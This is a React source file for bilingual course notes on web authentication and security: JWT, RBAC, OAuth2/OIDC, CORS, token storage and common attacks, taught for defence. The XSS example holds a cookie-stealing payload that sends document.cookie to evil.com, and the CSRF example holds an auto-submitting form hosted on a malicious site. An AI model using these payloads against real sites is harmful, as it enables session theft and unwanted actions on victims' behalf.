import DayNav from "../../components/DayNav";
import CodeBlock from "../../components/CodeBlock";
import { Link } from "react-router-dom";
import { En, Zh } from "../../components/Lang";

export default function Notes() {
  return (
    <div className="page notes-page">
      <title>Day 16 Notes</title>
      <DayNav day="day16-auth-security" current="notes" />
      <header className="lecture-header">
        <p className="eyebrow">Week 4 · Day 16 · Notes</p>
        <h1>Authentication &amp; Security</h1>
        <p className="subtitle"><En>Executive summary → full walkthrough</En><Zh>核心摘要 → 完整讲解</Zh></p>
      </header>

      <section id="executive-summary" className="exec-summary">
        <h2><En>Section 1 — Executive Summary</En><Zh>第一节 — 核心摘要</Zh></h2>
        <p><En>The essentials — what you must be able to do by the end of today:</En><Zh>核心能力——今天结束时你必须能够做到的事情：</Zh></p>
        <ul>
          <li><En>Explain the difference between authentication and authorization, and where each runs</En><Zh>解释 authentication 和 authorization 的区别，以及各自运行的位置</Zh></li>
          <li><En>Implement a JWT login flow: issue a signed token, verify it in middleware, read the user off the request</En><Zh>实现 JWT 登录流程：签发签名 token、在 middleware 中验证、从请求中读取用户信息</Zh></li>
          <li><En>Enforce RBAC so a customer sees only their own orders and an associate only their store&apos;s</En><Zh>实现 RBAC，使 customer 只能看到自己的订单，associate 只能看到自己门店的订单</Zh></li>
          <li><En>Configure CORS correctly, and explain why a browser blocks a request the server never rejected</En><Zh>正确配置 CORS，并解释为何浏览器会拦截一个服务器并未拒绝的请求</Zh></li>
          <li><En>Describe the OAuth2 / OIDC authorization-code flow in order, and what SSO adds on top</En><Zh>按顺序描述 OAuth2 / OIDC 授权码流程，以及 SSO 在其上增加了什么</Zh></li>
          <li><En>Spot and fix an IDOR — an authorization check missing from the service layer</En><Zh>发现并修复 IDOR 漏洞——服务层缺少 authorization 检查</Zh></li>
        </ul>
        <p>
          <En>Want more? <Link to="/week4/day16-auth-security/concepts">View all concepts?</Link></En>
          <Zh>想了解更多？<Link to="/week4/day16-auth-security/concepts">查看全部概念</Link></Zh>
        </p>
      </section>

      <section id="full-walkthrough">
        <h2><En>Section 2 — Full Walkthrough</En><Zh>第二节 — 完整讲解</Zh></h2>

        <h3><En>1. AuthN vs. AuthZ</En><Zh>1. 认证（AuthN）vs. 授权（AuthZ）</Zh></h3>
        <table className="ref-table">
          <thead>
            <tr>
              <th></th>
              <th><En>Authentication (AuthN)</En><Zh>认证（AuthN）</Zh></th>
              <th><En>Authorization (AuthZ)</En><Zh>授权（AuthZ）</Zh></th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><En>Question</En><Zh>问题</Zh></td>
              <td><En>Who are you?</En><Zh>你是谁？</Zh></td>
              <td><En>Are you allowed to do this?</En><Zh>你有权限做这件事吗？</Zh></td>
            </tr>
            <tr>
              <td><En>Runs</En><Zh>执行时机</Zh></td>
              <td><En>Once, at login — then re-verified per request from the token</En><Zh>登录时执行一次，此后每次请求从 token 重新验证</Zh></td>
              <td><En>On every protected operation</En><Zh>每次受保护操作时都执行</Zh></td>
            </tr>
            <tr>
              <td><En>Lives in</En><Zh>所在位置</Zh></td>
              <td><En>Middleware (verify the token, attach the user)</En><Zh>Middleware（验证 token，将用户信息附加到请求）</Zh></td>
              <td><En>The service layer, where the resource is actually known</En><Zh>服务层——真正掌握资源信息的地方</Zh></td>
            </tr>
            <tr>
              <td><En>Failure code</En><Zh>失败状态码</Zh></td>
              <td>
                <code>401 Unauthorized</code>
              </td>
              <td>
                <code>403 Forbidden</code>
              </td>
            </tr>
          </tbody>
        </table>
        <p className="callout">
          <En><code>401</code> means &quot;I don&apos;t know who you are&quot;; <code>403</code> means &quot;I know exactly who you are, and no.&quot;</En>
          <Zh><code>401</code> 表示"我不知道你是谁"；<code>403</code> 表示"我知道你是谁，但不行。"</Zh>
        </p>

        <h3><En>2. Session-based auth (and why it doesn&apos;t scale)</En><Zh>2. 基于 session 的认证（以及为何难以扩展）</Zh></h3>
        <p><En>Before JWT, the standard was a server-side session tied to a cookie:</En><Zh>在 JWT 出现之前，标准做法是将服务端 session 与 cookie 绑定：</Zh></p>
        <CodeBlock
          language="plaintext"
          code={`1. User logs in with email + password
2. Server creates a session record (sessionId -> { userId, ... }) in memory/Redis
3. Server responds with Set-Cookie: sessionId=abc123
4. Browser sends that cookie automatically on every later request
5. Server looks up abc123 in the session store to know who's asking`}
        />
        <table className="ref-table">
          <thead>
            <tr>
              <th></th>
              <th><En>Session-based</En><Zh>基于 Session</Zh></th>
              <th>JWT</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><En>Server stores</En><Zh>服务器是否存储</Zh></td>
              <td><En>Yes — one record per logged-in user</En><Zh>是——每个已登录用户对应一条记录</Zh></td>
              <td><En>Nothing — the token carries its own claims</En><Zh>否——token 自带声明信息</Zh></td>
            </tr>
            <tr>
              <td><En>Scaling to many servers</En><Zh>多服务器扩展</Zh></td>
              <td><En>Needs a shared session store (Redis) or sticky sessions</En><Zh>需要共享的 session 存储（如 Redis）或粘性会话</Zh></td>
              <td><En>Any instance can verify a token on its own</En><Zh>任意实例均可独立验证 token</Zh></td>
            </tr>
          </tbody>
        </table>
        <p className="callout">
          <En>The session store becomes a shared dependency every server instance needs access to — that statefulness is the exact problem JWT is designed to remove.</En>
          <Zh>session 存储成为每个服务器实例都需要访问的共享依赖——这种有状态性正是 JWT 设计要解决的问题。</Zh>
        </p>

        <h3><En>3. The JWT workflow</En><Zh>3. JWT 工作流程</Zh></h3>
        <p>
          <En>A JWT is three base64url chunks joined by dots: <code>header.payload.signature</code>. The payload is readable by anyone — the signature only proves it wasn&apos;t <em>edited</em>.</En>
          <Zh>JWT 由三段 base64url 编码内容以点号连接而成：<code>header.payload.signature</code>。payload 任何人都可以读取——签名只是证明内容未被<em>篡改</em>。</Zh>
        </p>
        <CodeBlock
          language="json"
          code={`{
  "sub": "412",
  "role": "store_associate",
  "storeId": 7,
  "iat": 1735689600,
  "exp": 1735693200
}`}
        />
        <p>
          <En>The intuition that matters: the server never evaluates what the payload{" "}
          <em>means</em> — it only checks whether the token is <em>authentic</em>. That check is a calculation, not a lookup:</En>
          <Zh>关键直觉：服务器不会解读 payload 的<em>含义</em>——只验证 token 是否<em>真实可信</em>。这个验证是计算过程，而非查表：</Zh>
        </p>
        <CodeBlock
          language="plaintext"
          code={`header  = { "alg": "HS256", "typ": "JWT" }
payload = { "sub": "412", "role": "store_associate", ... }
secret  = known only to the server (JWT_SECRET) — never sent, never stored in the token

signature = HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)

token = base64url(header) + "." + base64url(payload) + "." + signature`}
        />
        <p><En>The same three ingredients run twice — once to issue the token, once to verify it:</En><Zh>同样的三个要素运算两次——一次用于签发 token，一次用于验证：</Zh></p>
        <CodeBlock
          language="plaintext"
          code={`ISSUE  (login)
  client --- email + password -----------> server
  client <--- header.payload.signature ---- server   (server signs with its secret)

VERIFY  (every request after)
  client --- Authorization: Bearer <token> --> server
  server recomputes the signature from the token's own header + payload,
  using its OWN secret, and compares it to the signature already on the token

  match    -> token wasn't edited, and came from this server -> trust the payload
  mismatch -> reject: wrong secret, tampered payload, or expired`}
        />
        <p className="callout">
          <En>The server never looks the token up anywhere. Validity is math it redoes on the spot, not a record it checks against — that&apos;s the entire meaning of &quot;stateless&quot;.</En>
          <Zh>服务器从不查询 token。有效性是就地重新计算的结果，而非对比某条记录——这就是「无状态」的全部含义。</Zh>
        </p>
        <div className="concept">
          <p className="concept-label">Concept</p>
          <ul>
            <li>
              <En>JWTs are <strong>stateless</strong> — the server stores nothing, so any instance can verify any token. That is what makes them fit a load-balanced, multi-service backend.</En>
              <Zh>JWT 是<strong>无状态</strong>的——服务器不存储任何内容，因此任意实例都能验证任意 token。这使其适用于负载均衡的多服务后端。</Zh>
            </li>
            <li>
              <En>The cost of statelessness is that you <strong>can&apos;t revoke one</strong>. A stolen token stays valid until it expires — see Section 10 for the access/refresh split that manages that.</En>
              <Zh>无状态的代价是<strong>无法主动吊销</strong> token。被盗的 token 在过期前始终有效——第 10 节介绍了通过 access/refresh 拆分来解决此问题的方案。</Zh>
            </li>
            <li>
              <En>Never put anything secret in the payload. It is encoded, not encrypted — anyone can read it.</En>
              <Zh>永远不要在 payload 中存放任何机密信息。它只是编码，而非加密——任何人都可以读取。</Zh>
            </li>
          </ul>
        </div>

        <h3><En>4. RBAC in the service layer</En><Zh>4. 服务层中的 RBAC</Zh></h3>
        <p>
          <En>Four roles, and each one changes <em>which rows</em> a query is allowed to return — not just which endpoints are reachable:</En>
          <Zh>四个角色，每个角色决定查询允许返回<em>哪些行</em>——不只是哪些 endpoint 可访问：</Zh>
        </p>
        <table className="ref-table">
          <thead>
            <tr>
              <th><En>Role</En><Zh>角色</Zh></th>
              <th><En>Can see</En><Zh>可查看</Zh></th>
              <th><En>Can do</En><Zh>可操作</Zh></th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>
                <code>customer</code>
              </td>
              <td><En>Only their own orders</En><Zh>仅自己的订单</Zh></td>
              <td><En>View status</En><Zh>查看状态</Zh></td>
            </tr>
            <tr>
              <td>
                <code>store_associate</code>
              </td>
              <td><En>Only orders routed to their store</En><Zh>仅路由到其门店的订单</Zh></td>
              <td><En>Advance picking → packed → shipped</En><Zh>推进 picking → packed → shipped 流程</Zh></td>
            </tr>
            <tr>
              <td>
                <code>fulfillment_manager</code>
              </td>
              <td><En>Any order</En><Zh>任意订单</Zh></td>
              <td><En>Re-route, override a routing decision</En><Zh>重新路由，覆盖路由决策</Zh></td>
            </tr>
            <tr>
              <td>
                <code>admin</code>
              </td>
              <td><En>Everything</En><Zh>全部</Zh></td>
              <td><En>Everything</En><Zh>全部</Zh></td>
            </tr>
          </tbody>
        </table>
        <CodeBlock
          language="typescript"
          code={`// A route-level role guard — necessary, but not sufficient on its own.
router.patch(
  "/orders/:id/reroute",
  requireAuth,
  requireRole("fulfillment_manager", "admin"),
  orderController.reroute
);`}
        />
        <div className="concept">
          <p className="concept-label">Concept</p>
          <ul>
            <li>
              <En>A fixed list of roles is the simple case. Real authorization usually depends on more than role alone — resource ownership, group membership, plan tier, time of day. Whether that mix still counts as &quot;RBAC&quot; or is really ABAC (attribute-based) is a semantic argument, not a practical one.</En>
              <Zh>固定角色列表只是简单情形。真实的 authorization 通常不只依赖角色——还涉及资源归属、群组成员身份、套餐等级、时间等因素。是否仍属于「RBAC」还是应称为 ABAC（基于属性的访问控制）只是语义之争，并无实践意义。</Zh>
            </li>
            <li>
              <En>Production systems centralize that decision in a <strong>policy engine</strong> (e.g. Open Policy Agent, AWS Cedar, casbin) — one place that answers{" "}<code>can(user, action, resource)</code> for every check in the app, instead of hand-rolled <code>if</code> statements scattered across services.</En>
              <Zh>生产系统将该决策集中在<strong>策略引擎</strong>（如 Open Policy Agent、AWS Cedar、casbin）中——一处统一回答 <code>can(user, action, resource)</code>，而非在各服务中散落手写的 <code>if</code> 语句。</Zh>
            </li>
            <li>
              <En>Some engines write those rules as a declarative policy file (OPA&apos;s Rego, Cedar); others are just a plain function. Either way it&apos;s the same shape: data describing who can do what, evaluated against the current user and resource.</En>
              <Zh>有些引擎将规则写成声明式策略文件（OPA 的 Rego、Cedar）；有些只是普通函数。无论哪种，形式相同：描述谁能做什么的数据，结合当前用户和资源进行评估。</Zh>
            </li>
          </ul>
        </div>
        <p>
          <En>Concretely, the &quot;more granular&quot; cases — one associate also allowed to issue refunds, a grant that doesn&apos;t fit any existing role — become attributes checked alongside the role, not new roles:</En>
          <Zh>具体而言，「更细粒度」的情形——某个 associate 还被授权退款，某项授权不适合任何现有角色——变成在角色之外追加检查的属性，而非新角色：</Zh>
        </p>
        <CodeBlock
          language="typescript"
          code={`const policies = [
  { role: "customer", action: "read", resource: "order",
    allow: (user, order) => order.customerId === user.id },
  { role: "store_associate", action: "update", resource: "order",
    allow: (user, order) => order.storeId === user.storeId },
];

function can(user: AuthUser, action: string, order: Order) {
  const byRole = policies.some(
    (p) => p.role === user.role && p.action === action && p.allow(user, order)
  );
  // A one-off grant that doesn't fit the role, e.g. this associate can also refund:
  const byGrant = user.extraPermissions?.includes(\`\${action}:order\`);
  return byRole || Boolean(byGrant);
}`}
        />
        <p className="callout">
          <En>Every checkpoint still calls the same <code>can(user, action, resource)</code> — the engine just gets more attributes to look at as the rules get more granular, instead of the app growing more <code>if</code> branches.</En>
          <Zh>每个检查点仍然调用同一个 <code>can(user, action, resource)</code>——规则越细粒度，引擎只是多了更多属性可参考，而不是应用不断增加 <code>if</code> 分支。</Zh>
        </p>

        <h3><En>5. OAuth2 / OIDC / SSO</En><Zh>5. OAuth2 / OIDC / SSO</Zh></h3>
        <p>
          <En>The enterprise split this project uses: customers sign in with Google (OAuth2/OIDC), staff sign in through corporate SSO. Both are the same authorization-code flow.</En>
          <Zh>本项目采用的企业级方案：用户通过 Google（OAuth2/OIDC）登录，员工通过企业 SSO 登录。两者都使用同样的授权码流程。</Zh>
        </p>
        <CodeBlock
          language="plaintext"
          code={`1. App redirects the browser to the provider with client_id + redirect_uri + scope
2. User authenticates with the provider (your server never sees the password)
3. Provider redirects back to redirect_uri with a short-lived ?code=...
4. Server exchanges code + client_secret for tokens  [back channel, no browser]
5. Server receives: access_token (OAuth2)  +  id_token (OIDC, a JWT about the user)
6. Server issues its own session/JWT for the app`}
        />
        <div className="concept">
          <p className="concept-label">Concept</p>
          <ul>
            <li>
              <En><strong>OAuth2 is authorization</strong> — &quot;this app may act on your behalf.&quot; It answers what an app can access, not who you are.</En>
              <Zh><strong>OAuth2 是 authorization</strong>——「这个应用可以代表你进行操作」。它回答的是应用能访问什么，而不是你是谁。</Zh>
            </li>
            <li>
              <En><strong>OIDC is a thin identity layer on top</strong> that adds the{" "}<code>id_token</code> — a JWT that actually says who the user is.</En>
              <Zh><strong>OIDC 是在其上的薄身份层</strong>，增加了 <code>id_token</code>——一个真正说明用户身份的 JWT。</Zh>
            </li>
            <li>
              <En><strong>SSO</strong> is the outcome, not a protocol: one identity provider backs many apps, so logging into one logs you into all of them.</En>
              <Zh><strong>SSO</strong> 是结果而非协议：一个身份提供商支撑多个应用，登录其中一个即可登录所有应用。</Zh>
            </li>
            <li>
              <En>Step 4 happens server to server precisely so the <code>client_secret</code> never reaches the browser.</En>
              <Zh>第 4 步发生在服务器之间，正是为了确保 <code>client_secret</code> 永远不会传到浏览器端。</Zh>
            </li>
          </ul>
        </div>

        <h3><En>6. Okta &amp; Auth0 — buying auth instead of building it</En><Zh>6. Okta &amp; Auth0 ——购买认证服务而非自行构建</Zh></h3>
        <p>
          <En>Most companies don&apos;t hand-roll this flow — they buy an identity provider and configure it instead.</En>
          <Zh>大多数公司不会自己实现这套流程——而是购买身份提供商并进行配置。</Zh>
        </p>
        <table className="ref-table">
          <thead>
            <tr>
              <th></th>
              <th>Okta</th>
              <th>Auth0</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><En>Typical user</En><Zh>典型用户</Zh></td>
              <td><En>Your own employees</En><Zh>企业内部员工</Zh></td>
              <td><En>Your product&apos;s customers</En><Zh>产品的最终用户</Zh></td>
            </tr>
            <tr>
              <td><En>Used for</En><Zh>用途</Zh></td>
              <td><En>Workforce SSO into internal tools and SaaS apps</En><Zh>员工 SSO，用于登录内部工具和 SaaS 应用</Zh></td>
              <td><En>Login/signup for the app you&apos;re building (CIAM)</En><Zh>为你正在构建的应用提供登录/注册功能（CIAM）</Zh></td>
            </tr>
          </tbody>
        </table>
        <div className="concept">
          <p className="concept-label">Concept</p>
          <ul>
            <li>
              <En>Both provide MFA, enterprise SSO (SAML/OIDC federation), social login, breached-password detection, and compliance auditing out of the box — implementing these correctly yourself is expensive and easy to get subtly wrong.</En>
              <Zh>两者均开箱即用地提供 MFA、企业 SSO（SAML/OIDC 联合）、社交登录、泄露密码检测和合规审计——自行正确实现这些功能既昂贵又容易出现细微错误。</Zh>
            </li>
            <li><En>Okta acquired Auth0 in 2021, but the two products stay aimed at different users.</En><Zh>Okta 于 2021 年收购了 Auth0，但两款产品仍面向不同的用户群体。</Zh></li>
          </ul>
        </div>

        <h3>CORS</h3>
        <p>
          <En>CORS is a <strong>browser</strong> rule, not a server one. The server happily responds; the browser refuses to hand the response to JavaScript unless the headers allow the calling origin. Curl and Postman are unaffected — which is why &quot;it works in Postman&quot; is the classic CORS symptom.</En>
          <Zh>CORS 是<strong>浏览器</strong>规则，而非服务器规则。服务器照常响应；浏览器拒绝将响应传递给 JavaScript，除非响应头允许发起请求的源。curl 和 Postman 不受影响——这就是为何「在 Postman 里可以」是典型的 CORS 症状。</Zh>
        </p>
        <CodeBlock
          language="typescript"
          code={`import cors from "cors";

app.use(
  cors({
    origin: ["https://ops.retailco.com", "https://orders.retailco.com"],
    credentials: true, // required if the browser sends cookies
    methods: ["GET", "POST", "PATCH", "DELETE"],
  })
);`}
        />
        <p className="callout">
          <En><code>origin: &quot;*&quot;</code> and <code>credentials: true</code> are illegal together — the browser rejects the combination outright.</En>
          <Zh><code>origin: &quot;*&quot;</code> 与 <code>credentials: true</code> 不能同时使用——浏览器会直接拒绝这种组合。</Zh>
        </p>

        <h3><En>8. Attack patterns worth knowing by name</En><Zh>8. 值得熟记的攻击类型</Zh></h3>
        <table className="ref-table expandable-rows">
          <thead>
            <tr>
              <th><En>Attack</En><Zh>攻击类型</Zh></th>
              <th><En>What it does</En><Zh>攻击方式</Zh></th>
              <th><En>Fix</En><Zh>修复方法</Zh></th>
            </tr>
          </thead>
          <tbody>
            <tr className="has-detail">
              <td>IDOR</td>
              <td><En>Change an ID in the URL to read someone else&apos;s data</En><Zh>修改 URL 中的 ID 以读取他人数据</Zh></td>
              <td><En>Ownership check in the service layer, or a policy engine (Section 4)</En><Zh>在服务层进行归属检查，或使用策略引擎（见第 4 节）</Zh></td>
            </tr>
            <tr>
              <td colSpan={3}>
                <details>
                  <summary><En>See the IDOR bug and its fix in code</En><Zh>查看 IDOR 漏洞及其代码修复方案</Zh></summary>
                  <div className="answer">
                    <p>
                      <En>The endpoint checks that you are <em>a</em> customer, but never that the order is <em>yours</em> — change the ID in the URL and you read someone else&apos;s order:</En>
                      <Zh>该 endpoint 检查你是否为 customer，但从未验证这个订单是否属于你——修改 URL 中的 ID 即可读取他人订单：</Zh>
                    </p>
                    <CodeBlock
                      language="typescript"
                      good={[9, 10, 11, 12]}
                      bad={[3, 4]}
                      code={`export async function getOrder(orderId: number, user: AuthUser) {
  const order = await orderRepository.findById(orderId);
  if (!order) throw new OrderNotFoundError(orderId);
  return order; // any logged-in customer can read any order

  // The fix — scope the result to the caller, in the service layer:
  if (user.role === "customer" && order.customerId !== user.id) {
    throw new ForbiddenError();
  }
  if (user.role === "store_associate" && order.storeId !== user.storeId) {
    throw new ForbiddenError();
  }
  return order;
}`}
                    />
                    <p className="callout">
                      <En>Throw <code>404</code> instead of <code>403</code> for a resource the caller shouldn&apos;t know exists — a <code>403</code> confirms the order ID is real. Hand-writing this check per service is exactly why IDOR is the most common authorization bug; a policy engine replaces it with one{" "}<code>can()</code> call every path goes through.</En>
                      <Zh>对于调用方不应知道存在的资源，应返回 <code>404</code> 而非 <code>403</code>——<code>403</code> 会确认该订单 ID 真实存在。在每个服务中手写此检查正是 IDOR 成为最常见 authorization 漏洞的原因；策略引擎将其替换为每条路径都经过的一次 <code>can()</code> 调用。</Zh>
                    </p>
                  </div>
                </details>
              </td>
            </tr>
            <tr>
              <td>SQL injection</td>
              <td><En>User input becomes part of the SQL statement</En><Zh>用户输入被嵌入 SQL 语句</Zh></td>
              <td><En>Parameterized queries — never string-concatenate SQL</En><Zh>使用参数化查询——绝不拼接 SQL 字符串</Zh></td>
            </tr>
            <tr className="has-detail">
              <td>XSS</td>
              <td><En>Attacker&apos;s script runs in another user&apos;s browser</En><Zh>攻击者的脚本在其他用户的浏览器中执行</Zh></td>
              <td><En>Escape on output; React does this by default</En><Zh>输出时转义；React 默认已处理</Zh></td>
            </tr>
            <tr>
              <td colSpan={3}>
                <details>
                  <summary><En>See the XSS attack and its fix in code</En><Zh>查看 XSS 攻击及其代码修复方案</Zh></summary>
                  <div className="answer">
                    <p>
                      <En>A comment field stores raw HTML, and rendering it as HTML runs whatever script it contains in every other visitor&apos;s browser:</En>
                      <Zh>评论字段存储原始 HTML，将其作为 HTML 渲染会在每个访问者的浏览器中执行其中包含的任意脚本：</Zh>
                    </p>
                    <CodeBlock
                      language="typescript"
                      bad={[2]}
                      good={[7]}
                      code={`// Vulnerable — treats user input as markup
element.innerHTML = comment.text;
// if comment.text is: <img src=x onerror="fetch('//evil.com?c='+document.cookie)">
// ...that script now runs in every visitor's browser

// Fixed — treats it as text, never as markup
element.textContent = comment.text;`}
                    />
                    <p className="callout">
                      <En>React escapes everything rendered as <code>{"{"}value{"}"}</code> by default — this bug shows up when something bypasses that, like{" "}<code>dangerouslySetInnerHTML</code>.</En>
                      <Zh>React 默认对所有以 <code>{"{"}value{"}"}</code> 形式渲染的内容进行转义——该漏洞出现在某些绕过此机制的情况下，如使用 <code>dangerouslySetInnerHTML</code>。</Zh>
                    </p>
                  </div>
                </details>
              </td>
            </tr>
            <tr className="has-detail">
              <td>CSRF</td>
              <td><En>Another site makes an authenticated request using your cookie</En><Zh>其他网站利用你的 cookie 发起已认证请求</Zh></td>
              <td>
                <En><code>SameSite</code> cookies, CSRF tokens (a non-cookie bearer token is immune)</En>
                <Zh><code>SameSite</code> cookie、CSRF token（非 cookie 的 bearer token 天然免疫）</Zh>
              </td>
            </tr>
            <tr>
              <td colSpan={3}>
                <details>
                  <summary><En>See the CSRF attack and its fix in code</En><Zh>查看 CSRF 攻击及其代码修复方案</Zh></summary>
                  <div className="answer">
                    <p>
                      <En>Any other open tab — even a malicious site — can submit a form to your API, and the browser attaches your session cookie automatically:</En>
                      <Zh>任何其他打开的标签页——甚至是恶意网站——都可以向你的 API 提交表单，浏览器会自动附加你的 session cookie：</Zh>
                    </p>
                    <CodeBlock
                      language="plaintext"
                      code={`// hosted on evil.com, not your site
<form action="https://retailco.com/api/orders/9001/cancel" method="POST"></form>
<script>document.forms[0].submit()</script>
// the browser attaches retailco.com's session cookie to this request on its own`}
                    />
                    <p className="callout">
                      <En>Fix: <code>SameSite=Strict</code> (or <code>Lax</code>) on the session cookie, plus a CSRF token the form must echo back. A bearer token sent in a header instead of a cookie sidesteps this entirely — the browser won&apos;t attach it for you.</En>
                      <Zh>修复：在 session cookie 上设置 <code>SameSite=Strict</code>（或 <code>Lax</code>），并要求表单回传 CSRF token。改用请求头发送 bearer token 而非 cookie 可完全规避此问题——浏览器不会为你自动附加它。</Zh>
                    </p>
                  </div>
                </details>
              </td>
            </tr>
            <tr>
              <td>DDoS</td>
              <td><En>Flood the server with traffic so real users can&apos;t get through</En><Zh>用大量流量淹没服务器，使真实用户无法访问</Zh></td>
              <td><En>Rate limiting, a CDN/WAF in front, autoscaling</En><Zh>限流、在前面部署 CDN/WAF、自动扩缩容</Zh></td>
            </tr>
            <tr>
              <td>Mass assignment</td>
              <td>
                <En>Client sends <code>{"{"} role: &quot;admin&quot; {"}"}</code> and the ORM saves it</En>
                <Zh>客户端发送 <code>{"{"} role: &quot;admin&quot; {"}"}</code>，ORM 将其直接保存</Zh>
              </td>
              <td><En>Whitelist the fields you accept, never spread the body</En><Zh>白名单限制接受的字段，绝不直接展开请求体</Zh></td>
            </tr>
          </tbody>
        </table>
        <CodeBlock
          language="typescript"
          good={[5]}
          bad={[2]}
          code={`// SQL injection — the input becomes code
db.query(\`SELECT * FROM orders WHERE id = \${req.params.id}\`);

// Parameterized — the input can only ever be a value
db.query("SELECT * FROM orders WHERE id = $1", [req.params.id]);`}
        />
        <p className="callout">
          <En>Never store sensitive data as plaintext — passwords, SSNs, and similar PII. Hash passwords with bcrypt or argon2 (slow by design, the opposite of a plain SHA), and encrypt other sensitive fields at rest.</En>
          <Zh>永远不要以明文存储敏感数据——密码、身份证号及类似 PII。使用 bcrypt 或 argon2 对密码进行哈希（刻意设计为慢速，与普通 SHA 相反），并对其他敏感字段进行静态加密。</Zh>
        </p>

        <h3><En>9. Where to store the JWT</En><Zh>9. JWT 应存储在哪里</Zh></h3>
        <p><En>Storing the token is a separate decision from issuing it, and it&apos;s easy to get wrong:</En><Zh>存储 token 与签发 token 是两个独立的决策，且很容易出错：</Zh></p>
        <table className="ref-table">
          <thead>
            <tr>
              <th><En>Storage</En><Zh>存储方式</Zh></th>
              <th><En>Readable by JS (XSS risk)</En><Zh>可被 JS 读取（XSS 风险）</Zh></th>
              <th><En>Sent automatically</En><Zh>自动发送</Zh></th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>localStorage / sessionStorage</td>
              <td><En>Yes — any injected script can read and exfiltrate it</En><Zh>是——任何注入的脚本都可读取并窃取</Zh></td>
              <td><En>No, attached manually</En><Zh>否，需手动附加</Zh></td>
            </tr>
            <tr>
              <td><En>In-memory (JS variable/state)</En><Zh>内存中（JS 变量/state）</Zh></td>
              <td><En>Yes while running, but leaves nothing behind to steal at rest</En><Zh>运行时是，但不会留下静态数据可供窃取</Zh></td>
              <td><En>No, attached manually</En><Zh>否，需手动附加</Zh></td>
            </tr>
            <tr>
              <td>httpOnly cookie</td>
              <td><En>No — JavaScript can&apos;t read it at all</En><Zh>否——JavaScript 完全无法读取</Zh></td>
              <td><En>Yes, automatically</En><Zh>是，自动发送</Zh></td>
            </tr>
          </tbody>
        </table>
        <p className="callout">
          <En>Best practice: keep the access token in memory, or in an httpOnly, Secure,{" "}<code>SameSite</code> cookie — never in <code>localStorage</code>/<code>sessionStorage</code>, where any XSS can read it directly.</En>
          <Zh>最佳实践：将 access token 保存在内存中，或放入 httpOnly、Secure、<code>SameSite</code> cookie——绝不存入 <code>localStorage</code>/<code>sessionStorage</code>，任何 XSS 都能直接读取那里的内容。</Zh>
        </p>
        <p><En>When the token lives in memory, the client attaches it to every request by hand:</En><Zh>当 token 存在内存中时，客户端需手动将其附加到每次请求：</Zh></p>
        <CodeBlock
          language="typescript"
          code={`fetch("/api/orders", {
  headers: { Authorization: \`Bearer \${accessToken}\` },
});`}
        />
        <div className="concept">
          <p className="concept-label">Concept</p>
          <ul>
            <li>
              <En>An httpOnly cookie is sent automatically, so it needs the CSRF defenses from Section 8 — a bearer token in memory doesn&apos;t, since no other site can attach it for you.</En>
              <Zh>httpOnly cookie 会自动发送，因此需要第 8 节中的 CSRF 防护——内存中的 bearer token 则不需要，因为其他网站无法为你附加它。</Zh>
            </li>
          </ul>
        </div>

        <h3><En>10. Access tokens vs. refresh tokens</En><Zh>10. Access token vs. refresh token</Zh></h3>
        <p>
          <En>One short-lived token for API calls, one long-lived token whose only job is to mint new access tokens:</En>
          <Zh>一个用于 API 调用的短期 token，一个长期 token，其唯一职责是生成新的 access token：</Zh>
        </p>
        <CodeBlock
          language="plaintext"
          code={`1. Login returns access_token (~15 min) + refresh_token (days, stored more securely)
2. Client calls the API with access_token until it expires (401)
3. Client calls /auth/refresh with the refresh_token
4. Server verifies the refresh_token is still valid (not revoked), issues a new access_token
5. Client retries the original request with the new access_token`}
        />
        <div className="concept">
          <p className="concept-label">Concept</p>
          <ul>
            <li>
              <En>A short-lived access token limits the damage window if it&apos;s ever stolen — it expires before an attacker can do much with it.</En>
              <Zh>短期 access token 可限制被盗后的损害窗口——在攻击者能利用它做太多事情之前就已过期。</Zh>
            </li>
            <li>
              <En>The refresh token is long-lived, but it&apos;s checked against a server-side record and can be revoked — that&apos;s how you get &quot;log out everywhere&quot; despite JWTs being stateless.</En>
              <Zh>refresh token 是长期的，但会与服务端记录进行核对，可以被吊销——这就是在 JWT 无状态的前提下实现「全端退出」的方式。</Zh>
            </li>
            <li>
              <En>Rotating the refresh token on every use (issue a new one, invalidate the old) limits reuse if one ever leaks.</En>
              <Zh>每次使用时轮换 refresh token（签发新的，使旧的失效）可限制泄露后的重复使用风险。</Zh>
            </li>
          </ul>
        </div>
      </section>
    </div>
  );
}
